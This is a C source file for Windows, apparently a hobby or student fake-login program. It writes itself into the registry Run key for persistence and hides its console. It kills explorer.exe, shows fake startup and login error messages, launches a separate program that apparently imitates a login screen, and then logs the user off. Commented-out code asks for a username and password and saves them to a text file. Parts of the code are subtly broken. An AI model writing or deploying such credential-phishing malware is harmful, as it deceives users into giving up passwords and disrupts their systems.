#define _CRT_SECURE_NO_WARNINGS
#include <stdio.h>
#include <Windows.h>

void autorun();
int logon();

int main() 
{
	autorun();
	logon();
	
	return 0;
}

void autorun()
{
	HKEY hkey;
	char path[1000] = { 0 };
	RegOpenKeyEx(HKEY_CURRENT_USER, TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run"), 0, KEY_ALL_ACCESS, &hkey);
	GetModuleFileName(NULL, path, 1000);
	RegSetValueEx(hkey, TEXT("oib"), NULL, REG_SZ, (LPBYTE)path, (DWORD)(lstrlen(path) + 1) * sizeof(TCHAR));
	RegCloseKey(hkey);

}

int logon()
{
	HWND hwnd = GetConsoleWindow();
	ShowWindow(hwnd, SW_HIDE);
	/*char username[64];
	char password[64];*/
	FILE* f_out;
	HKEY hkey;
	wchar_t reg_main[] = L"OIB11";
	wchar_t reg_folder[] = L"logon";
	LPTSTR count = "0";
	DWORD bufLen = sizeof(count);
	if (RegOpenKeyEx(HKEY_CURRENT_USER, reg_main, 0, KEY_ALL_ACCESS, &hkey) != ERROR_SUCCESS)
	{
		RegCreateKeyEx(HKEY_CURRENT_USER, reg_main, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hkey, NULL);
		RegSetValueEx(hkey, reg_folder, 0, REG_SZ, "0", bufLen);
		(char)count == '0';
	}
	else
	{
		RegQueryValueEx(hkey, reg_folder, NULL, NULL, (LPBYTE)&count, &bufLen);
	}
	if ((char)count == '0')
	{
		RegSetValueEx(hkey, reg_folder, 0, REG_SZ, "1", bufLen);
		RegCloseKey(hkey);
		exit(0);
	}
	else if ((char)count == '1')
	{
		WinExec("Taskkill /IM explorer.exe /F", SW_HIDE);
		Sleep(100);
		system("cls");
		RegSetValueEx(hkey, reg_folder, 0, REG_SZ, "0", bufLen);
		MessageBox(NULL, L"There was an error starting the Windows 10 operating system.", L"STARTUP ERROR", MB_OK);

		/*printf("There was an error logging in to the account. Please enter your username and password.\n");
		printf("Login: ");
		scanf("%s", username);
		printf("Password: ");
		scanf("%s", password);
		if ((f_out = fopen("data.txt", "w")) == NULL)
			exit(1);
		fprintf(f_out, "Login: %s\n", username);
		fprintf(f_out, "Password: %s", password);*/

		//system("start C:\\Users\\yanav\\source\\repos\\ConsoleAplication1\\bin\\Debug\\net6.0-windows\\ConsoleAplication1.exe");

		STARTUPINFO si;
		PROCESS_INFORMATION pi;
		ZeroMemory(&si, sizeof(si));
		si.cb = sizeof(si);
		ZeroMemory(&pi, sizeof(pi));
		if (!CreateProcess(L"C:\\Users\\yanav\\source\\repos\\ConsoleAplication1\\bin\\Debug\\net6.0-windows\\ConsoleAplication1.exe", NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi))
		{
			printf("Hello CreateProcess failed (%d)\n", GetLastError());
			//getch();
			return;
		}
		WaitForSingleObject(pi.hProcess, INFINITE);
		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);

		MessageBox(NULL, L"Invalid password and login. The system will be rebooted.", L"LOGIN ERROR", MB_OK);
		printf("Rebooting...\n");
		//fclose(f_out);
		RegCloseKey(hkey);
		ExitWindows(EWX_LOGOFF, 0);
	}
	RegCloseKey(hkey);
}
